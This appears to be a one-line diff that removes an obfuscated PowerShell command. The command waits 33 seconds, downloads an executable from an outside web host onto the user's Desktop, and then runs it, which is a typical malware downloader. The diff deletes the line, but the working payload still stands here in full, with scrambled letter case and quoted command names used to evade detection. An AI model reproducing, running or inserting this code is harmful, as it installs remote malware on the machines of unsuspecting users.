@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('http://mogeronta.com/mxdn','$Des\4031182.exe');&'Start-Process' $Des\4031182.exe
